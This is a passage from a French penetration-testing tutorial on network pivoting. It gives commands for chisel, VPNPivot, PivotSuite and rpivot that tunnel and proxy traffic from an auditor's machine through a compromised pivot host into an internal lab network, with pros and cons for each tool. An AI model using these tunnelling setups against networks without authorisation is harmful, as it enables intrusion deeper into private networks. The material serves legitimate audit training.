				<div class="elementor-element elementor-element-dc60bf8 elementor-widget elementor-widget-text-editor" data-id="dc60bf8" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Lancer <span style="color: #ffffff; background-color: #474747; font-family: courier new;">chisel server -p 55555 –host 127.0.0.1 –socks5 -v</span> pour bénéficier d’un proxy socks ne fonctionne pas car chisel ne peut pas être utilisé comme proxy socks <strong>directement</strong>. De plus, il n’y pas d’option pour créer un serveur proxy socks via le client, uniquement le serveur peut le faire.</p><p>Pour
 pouvoir avoir un serveur proxy socks sur la machine pivot, il va 
falloir lancer un serveur chisel avec l’option socks, s’y connecter avec
 un 2ème client chisel et faire un local port forward sur le serveur 
chisel local afin de partager le serveur proxy socks avec le premier 
client, qui lui-même le transférera au serveur chisel distant qui se 
trouve sur la machine de l’auditeur. Pour résumer, il y aura 3 instances
 chisel sur la machine pivot (2 clients + 1 serveur).</p><p>Sur la machine pivot :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-8072555 elementor-widget elementor-widget-text-editor" data-id="8072555" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ chisel client -v http://192.168.2.149:8888 R:127.0.0.1:44444:127.0.0.1:55555</span><br><span style="color: #ffffff;">$ chisel server -p 62000 --host 127.0.0.1 --socks5 -v</span><br><span style="color: #ffffff;">$ chisel client -v http://127.0.0.1:62000 127.0.0.1:55555:socks</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-79fa9dc elementor-widget elementor-widget-text-editor" data-id="79fa9dc" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Note : </strong></p><p>Bien
 sûr, cette configuration avancée a pour but de n’utiliser que chisel, 
mais si on a déjà déployé un autre serveur proxy socks tel que 3proxy, 
il est possible de remplacer les 2 dernières commandes par <span style="color: #ffffff; background-color: #474747; font-family: courier new;">./socks -p55555 -tstop -d</span>.</p><p>Vérification :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-37d435a elementor-widget elementor-widget-text-editor" data-id="37d435a" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head http://10.42.42.2 --proxy socks5://127.0.0.1:44444</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-6ccdd27 elementor-widget elementor-widget-text-editor" data-id="6ccdd27" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Nul besoin de serveur SSH</li><li>Nul besoin de connaître les login/mot de passe d’un utilisateur</li><li>Encapsulation HTTP</li><li>Ouverture de port et cible dynamique</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>Ouverture de port sur la machine pivot</li><li>À déployer sur la machine pivot</li><li>Tunnel TCP</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-0eb3263 elementor-widget elementor-widget-heading" data-id="0eb3263" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">VPN Pivot - VPN tunnel</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-693c78d elementor-widget elementor-widget-text-editor" data-id="693c78d" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Exemple théorique</strong></p><p>VPN Pivot est disponible sur <a href="https://github.com/0x36/VPNPivot">GitHub</a>.</p><p>VPNPivot
 fonctionne essentiellement comme la technique de VPN over SSH sauf que 
le chiffrement est assuré par SSL/TLS et pas par SSH.</p><p>Sur la 
machine de l’auditeur, on lance le serveur en spécifiant l’interface 
réseau virtuelle temporaire à créer, l’IP que l’on souhaite avoir dans 
le réseau distant et le port sur lequel le serveur va écouter.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-7f7e5c1 elementor-widget elementor-widget-text-editor" data-id="7f7e5c1" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sudo pivots -i tun7 -I 10.42.42.3/24 -p 28888 -v</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-41c1366 elementor-widget elementor-widget-text-editor" data-id="41c1366" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Sur la machine pivot, il ne faut pas oublier d’activer l’ip forwarding.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-eb90688 elementor-widget elementor-widget-text-editor" data-id="eb90688" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sudo sysctl net.ipv4.conf.default.forwarding=1</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-e80f89e elementor-widget elementor-widget-text-editor" data-id="e80f89e" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Toujours 
sur la machine pivot, on lance le client en spécifiant l’adresse du 
serveur et l’adresse de l’interface sur laquelle se trouve le réseau 
distant.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-6a4c9fd elementor-widget elementor-widget-text-editor" data-id="6a4c9fd" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sudo pivotc 192.168.2.149 28888 10.42.42.1</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-c9a4c32 elementor-widget elementor-widget-text-editor" data-id="c9a4c32" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Encore une
 fois sur la machine pivot, il faut mettre en place une règle de NAT 
pour ne pas avoir besoin de déployer de route sur le réseau distant.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-05c2bdd elementor-widget elementor-widget-text-editor" data-id="05c2bdd" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sudo iptables -t nat -A POSTROUTING -s 10.42.42.3 -o eth1 -j MASQUERADE
$ sudo iptables -t nat -A POSTROUTING -s 10.42.42.3 -d 10.42.42.0/24 -j MASQUERADE
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-0bb92f9 elementor-widget elementor-widget-text-editor" data-id="0bb92f9" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Note : </strong></p><p>Le code n’est malheureusement pas maintenu et le fonctionnement interne de l’application est un peu obscure.</p><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>“Tunnellisation” de couche 2 (IP forwarding)</li><li>Nul besoin de serveur SSH</li><li>Nul besoin de connaître les login/mots de passe d’un utilisateur</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>Activation de l’IP forwarding sur le serveur : nécessite les droits root</li><li>Mise en place de NAT sur le pivot : nécessite les droits root</li><li>Beaucoup de configuration requise</li><li>Mise en place des pré-requis peu furtive</li><li>À déployer sur la machine pivot</li><li>TPC over TCP (lent)</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-01da310 elementor-widget elementor-widget-heading" data-id="01da310" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">PivotSuite - multi port forwarding + proxy SOCKS</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-2d80454 elementor-widget elementor-widget-text-editor" data-id="2d80454" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>PivotSuite est disponible sur <a href="https://github.com/RedTeamOperations/PivotSuite">GitHub</a>.</p><p>PivotSuite
 est un outil qui va permettre de mettre en place l’équivalent d’un SSH 
[local|reverse remote|reverse dynamic] port forwarding mais qui supporte
 en plus l’UDP over TCP, le pivoting multi-niveau (comme nous avons vu 
avec Metasploit), l’énumération réseau et serveur proxy SOCK5 inclus.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-6475e43 elementor-widget elementor-widget-heading" data-id="6475e43" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">“Remote” local port forwarding</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-551afe8 elementor-widget elementor-widget-text-editor" data-id="551afe8" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Dans ce cas de figure, seul le serveur (sur la machine pivot) est utilisé, il n’y a pas besoin du client car on fait un <em>local port forwarding</em> sur la machine pivot (donc à distance, d’où le <em>“remote”</em>) et au lieu d’exposer <span style="color: #ffffff; background-color: #474747; font-family: courier new;">127.0.0.1</span> on expose l’IP du réseau externe.</p><p>Il faut donc lancer l’une des deux commandes suivantes sur la machine pivot :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-8d8aba7 elementor-widget elementor-widget-text-editor" data-id="8d8aba7" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ pivotsuite -S -F --server-option=PF --forward-ip=10.42.42.2 --forward-port=80 --server-ip=192.168.2.105 --server-port=8080
$ pivotsuite -S -F --server-option=PF --remote-ip=10.42.42.2 --remote-port=80 --server-ip=192.168.2.105 --server-port=8080
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-e34fea9 elementor-widget elementor-widget-text-editor" data-id="e34fea9" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Note : </strong></p><p>Les options <span style="color: #ffffff; background-color: #474747; font-family: courier new;">–forward-XX</span> et <span style="color: #ffffff; background-color: #474747; font-family: courier new;">–remote-XX</span> sont exactement identiques pour le mode serveur. La documentation officielle utilise l’un ou l’autre ce qui porte à confusion.</p><p>On peut consulter Srv App 2 directement en contactant Srv App 1.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-30227e4 elementor-widget elementor-widget-text-editor" data-id="30227e4" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head http://192.168.2.105:8080</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-5b795d0 elementor-widget elementor-widget-text-editor" data-id="5b795d0" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Évidemment,
 le gros désavantage de cette technique de remote local port forwarding 
est qu’elle expose le port à tout le monde sur le réseau externe. 
Malheureusement, il n’est pas possible d’utiliser le client pour 
transférer le trafic sur la machine de l’attaquant et d’y exposer un 
port en local.</p><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Nul besoin de connaître les login/mot de passe d’un utilisateur</li><li>Fonctionne avec python 2 ou 3</li></ul><p><strong>Inconvénients </strong>:</p><ul class="o-square-list"><li>À déployer sur la machine pivot</li><li>Port exposé à tout le monde</li><li>Besoin d’ouvrir un port sur la machine pivot</li><li>Ouverture port par port</li><li>Tunnel TCP</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-130f489 elementor-widget elementor-widget-heading" data-id="130f489" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">“Remote” dynamic port forwarding</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-cda3116 elementor-widget elementor-widget-text-editor" data-id="cda3116" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Le dynamic
 port forwarding n’est jamais qu’un local port forwarding + proxy socks 
géré automatiquement en interne. Là encore il n’y a pas moyen de 
transférer le trafic au client donc il faut exposer un port directement 
sur la machine pivot.</p><p>On lance donc le serveur en mode proxy SOCKS sur la machine pivot.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a3bc106 elementor-widget elementor-widget-text-editor" data-id="a3bc106" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ pivotsuite -S -F --server-option=SP --server-ip=192.168.2.105 --server-port=8080</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-1411e87 elementor-widget elementor-widget-text-editor" data-id="1411e87" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Cela permet à l’auditeur de se connecter au proxy SOCKS pour faire ses requêtes.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-0771672 elementor-widget elementor-widget-text-editor" data-id="0771672" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head http://10.42.42.2 --proxy socks5://192.168.2.105:8080</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-fe6b9d8 elementor-widget elementor-widget-text-editor" data-id="fe6b9d8" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Nul besoin de connaître les login/mot de passe d’un utilisateur</li><li>Fonctionne avec python 2 ou 3</li><li>Ouverture de port et cible dynamique</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>À déployer sur la machine pivot</li><li>Besoin d’ouvrir un port sur la machine pivot</li><li>Proxy accessible à tout le monde</li><li>Tunnel TCP</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-7a065a1 elementor-widget elementor-widget-heading" data-id="7a065a1" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Reverse remote port forwarding</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-048fd09 elementor-widget elementor-widget-text-editor" data-id="048fd09" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Sur la machine de l’auditeur, on lance le serveur :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-6e76506 elementor-widget elementor-widget-text-editor" data-id="6e76506" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ pivotsuite -S -W --server-ip 192.168.2.149 --server-port 8090</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-cbaff2d elementor-widget elementor-widget-text-editor" data-id="cbaff2d" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Sur la machine pivot, on lance le client :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a17b70a elementor-widget elementor-widget-text-editor" data-id="a17b70a" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ pivotsuite -C -O PF -R --local-ip 127.0.0.1 --local-port 9999 --remote-ip 10.42.42.2 --remote-port 80 --server-ip 192.168.2.149 --server-port 8090</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-caf1d85 elementor-widget elementor-widget-text-editor" data-id="caf1d85" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Puis l’auditeur peut contacter le serveur distant :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-140bcea elementor-widget elementor-widget-text-editor" data-id="140bcea" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head http://127.0.0.1:9999</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-3736b42 elementor-widget elementor-widget-text-editor" data-id="3736b42" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Nul besoin de connaître les login/mots de passe d’un utilisateur</li><li>Fonctionne avec python 2 ou 3</li><li>Pas d’ouverture de port sur le pivot</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>À déployer sur la machine pivot</li><li>Ouverture port par port</li><li>Tunnel TCP</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-baefedf elementor-widget elementor-widget-heading" data-id="baefedf" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Reverse dynamic port forwarding</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-f292dd2 elementor-widget elementor-widget-text-editor" data-id="f292dd2" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Sur la machine de l’auditeur on lance le serveur :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-5f42931 elementor-widget elementor-widget-text-editor" data-id="5f42931" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ pivotsuite -S -W --server-ip 192.168.2.149 --server-port 8090</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-c2f7c2e elementor-widget elementor-widget-text-editor" data-id="c2f7c2e" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Malheureusement,
 l’outil&nbsp; ne permet pas de choisir l’adresse locale (sur la machine
 de l’auditeur) sur laquelle sera liée le serveur proxy SOCKS. Le 
serveur (machine de l’auditeur) lance donc un proxy SOCKS sur l’adresse <span style="color: #ffffff; background-color: #474747; font-family: courier new;">0.0.0.0</span>,
 c’est-à-dire sur toutes les interfaces et choisit un port aléatoire 
différent à chaque connexion du client. Cela veut dire que le proxy 
SOCKS sera exposé publiquement sur toutes les interfaces de la machine 
de l’auditeur, ce qui pose un gros problème de sécurité, et 
accessoirement que le port sera imprévisible et donc qu’il rendra le 
scripting plus difficile.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-e2390af elementor-widget elementor-widget-text-editor" data-id="e2390af" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ pivotsuite -C -O SP --server-ip 192.168.2.149 --server-port 8090</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a16dfd8 elementor-widget elementor-widget-text-editor" data-id="a16dfd8" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Après la connexion du client, on observe que le serveur est en écoute sur toutes les interfaces sur un port aléatoire :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a630041 elementor-widget elementor-widget-text-editor" data-id="a630041" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">2019-09-05 17:02:05,900 - DEBUG - [+] Client 192.168.2.105:59294 Connected
2019-09-05 17:02:05,900 - DEBUG - [+] Configure ProxyChains 0.0.0.0:1903 ==&gt;&gt; HOST 192.168.2.105
2019-09-05 17:04:41,915 - DEBUG - [+] Client 192.168.2.105:59298 Connected
2019-09-05 17:04:41,916 - DEBUG - [+] Configure ProxyChains 0.0.0.0:7684 ==&gt;&gt; HOST 192.168.2.105
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-4f76cd7 elementor-widget elementor-widget-text-editor" data-id="4f76cd7" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>On peut donc malheureusement se connecter au proxy depuis n’importe quelle interface.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-37d70dd elementor-widget elementor-widget-text-editor" data-id="37d70dd" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head http://10.42.42.2 --proxy socks5://192.168.2.149:7684
$ curl --head http://10.42.42.2 --proxy socks5://127.0.0.1:7684
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-381107d elementor-widget elementor-widget-text-editor" data-id="381107d" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Ajouter <span style="color: #ffffff; background-color: #474747; font-family: courier new;">–local-ip 127.0.0.1 –local-port 9999</span> aux options du client ne change rien, ces paramètres sont ignorés.</p><p>L’usage de cet outil est donc fortement déconseillé.</p><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Nul besoin de connaître les login/mot de passe d’un utilisateur</li><li>Fonctionne avec python 2 ou 3</li><li>Ouverture de port et cible dynamique</li><li>Pas d’ouverture de port sur le pivot</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>À déployer sur la machine pivot</li><li>Proxy accessible à tout le monde</li><li>Port aléatoire</li><li>Tunnel TCP</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-825a0fd elementor-widget elementor-widget-heading" data-id="825a0fd" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Scénario simplifié : cible derrière un NAT</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-909d6c7 elementor-widget elementor-widget-text-editor" data-id="909d6c7" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Nous avons
 vu précédemment le cas d’une machine accessible avec une IP publique, 
cependant le cas le plus commun implique une machine qui se trouve 
derrière un NAT. Le trafic vers la cible est transféré port par port. 
Cela veut dire que tous les ports liés, autres que ceux présents dans 
les règles de translation de port, ne seront pas accessibles depuis 
l’extérieur.</p><p>Par exemple, lors d’un test externe en boîte noire, 
on peut imaginer un serveur qui se trouve derrière un pare-feu dont seul
 le service SSH sur le port 22 est “NATé”. Dans le sens attaquant vers 
pivot, il n’est possible que de passer par le port 22 qui est déjà 
occupé par le serveur SSH, par contre dans l’autre sens, s’il n’y a pas 
de règle de pare-feu qui l’empêche, il est possible d’utiliser tous les 
ports.</p><p>C’est pourquoi utiliser la machine pivot non plus comme 
serveur SSH mais comme client permet de contourner cela ou bien encore 
de monter un VPN à l’intérieur de la session SSH, et que certaines des 
techniques que nous avons vues précédemment sont toujours valides dans 
ce cas de figure.</p><ul class="o-square-list"><li>SSH reverse remote port forwarding</li><li>SSH reverse remote port forwarding + proxy SOCKS</li><li>VPN over SSH</li><li>Chisel – reverse remote port forwarding</li><li>Chisel – reverse remote port forwarding + proxy SOCKS</li><li>VPN Pivot – VPN tunnel</li><li>PivotSuite – Reverse remote port forwarding</li><li>PivotSuite – Reverse dynamic port forwarding</li></ul><p>Par la suite, nous verrons des méthodes supplémentaires à l’aide d’outils qui permettent de traverser le NAT simplement.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-01ed4b6 elementor-widget elementor-widget-heading" data-id="01ed4b6" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Rpivot - Reverse proxy</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-2d847db elementor-widget elementor-widget-text-editor" data-id="2d847db" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Rpivot est disponible sur <a href="https://github.com/klsecservices/rpivot">GitHub</a>.</p><p>Rpivot
 est un reverse proxy SOCKS, il permet de se connecter à la machine de 
l’auditeur et d’y lier un proxy SOCKS. Il fonctionne de manière 
similaire au SSH dynamic port forwarding mais dans l’autre sens.</p><p>On lance le serveur rpivot sur la machine de l’auditeur :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-7ab0f45 elementor-widget elementor-widget-text-editor" data-id="7ab0f45" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ python2 server.py --server-port 9999 --server-ip 192.168.2.149 --proxy-ip 127.0.0.1 --proxy-port 21000
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-266c942 elementor-widget elementor-widget-text-editor" data-id="266c942" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Puis le client sur la machine pivot :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-5e15674 elementor-widget elementor-widget-text-editor" data-id="5e15674" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ python2 client.py --server-ip 192.168.2.149 --server-port 9999
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-af9ffc7 elementor-widget elementor-widget-text-editor" data-id="af9ffc7" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>L’auditeur peut donc utiliser le proxy SOCKS4 :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-d81e035 elementor-widget elementor-widget-text-editor" data-id="d81e035" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head http://10.42.42.2 --proxy socks4://127.0.0.1:21000
HTTP/1.1 302 Found
Date: Thu, 29 Aug 2019 13:24:13 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1c PHP/7.3.8
X-Powered-By: PHP/7.3.8
Location: http://10.42.42.2/dashboard/
Content-Type: text/html; charset=UTF-8
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a93c774 elementor-widget elementor-widget-text-editor" data-id="a93c774" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Il est possible de pivoter à travers un proxy NTLM, ce qui peut s’avérer utile en environnement Windows.</p><p>Afin
 de faciliter le déploiement, pour ne pas avoir à décompresser et 
extraire l’archive du dépôt git de rpivot sur la machine pivot, il est 
possible de générer une archive ZIP qui sera directement utilisable par 
python, aussi bien comme client que comme serveur.</p><p>L’archive peut être générée avec <span style="color: #ffffff; background-color: #474747; font-family: courier new;">zip</span> ou <span style="color: #ffffff; background-color: #474747; font-family: courier new;">7z</span> :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-232fffe elementor-widget elementor-widget-text-editor" data-id="232fffe" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ zip rpivot.zip -r *.py ./ntlm_auth/
$ 7z a -r rpivot.zip *.py ./ntlm_auth/</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-1c898a3 elementor-widget elementor-widget-text-editor" data-id="1c898a3" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Ensuite l’archive est utilisable en tant que serveur ou client :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-c4faf9e elementor-widget elementor-widget-text-editor" data-id="c4faf9e" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ python2 rpivot.zip server --server-port 9999 --server-ip 192.168.2.149 --proxy-ip 127.0.0.1 --proxy-port 21000
$ python2 rpivot.zip client --server-ip 192.168.2.149 --server-port 9999
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-acfede5 elementor-widget elementor-widget-text-editor" data-id="acfede5" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Nul besoin que le serveur SSH soit activé</li><li>Nul besoin de connaître les login/mot de passe d’un utilisateur</li><li>Ouverture de port et cible dynamique</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>Nécessite python 2</li><li>Déploiement du script sur le pivot</li><li>Tunnel TCP</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-1d4ecf4 elementor-widget elementor-widget-heading" data-id="1d4ecf4" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
